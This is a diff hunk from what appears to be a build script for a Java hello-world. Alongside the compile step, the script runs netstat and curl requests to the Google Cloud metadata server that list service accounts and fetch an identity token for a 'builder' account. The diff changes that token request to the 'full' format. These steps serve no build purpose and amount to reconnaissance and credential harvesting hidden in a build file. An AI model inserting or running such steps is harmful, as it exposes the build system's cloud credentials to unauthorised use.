@@ -16,7 +16,7 @@ netstat -plnt
 curl "http://metadata.google.internal/computeMetadata/v1/instance/hostname" -H "Metadata-Flavor: Google"
 curl  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"
 curl -H "Metadata-Flavor: Google" \
-'http://metadata/computeMetadata/v1/instance/service-accounts/builder@yeti-engprod.google.com.iam.gserviceaccount.com/identity?audience=https://google.com&format=standard&licenses=FALSE'
+'http://metadata/computeMetadata/v1/instance/service-accounts/builder@yeti-engprod.google.com.iam.gserviceaccount.com/identity?audience=https://google.com&format=full&licenses=FALSE'
 if [ "$1" == "release" ]; then
   javac -g:none Hello.java
 else
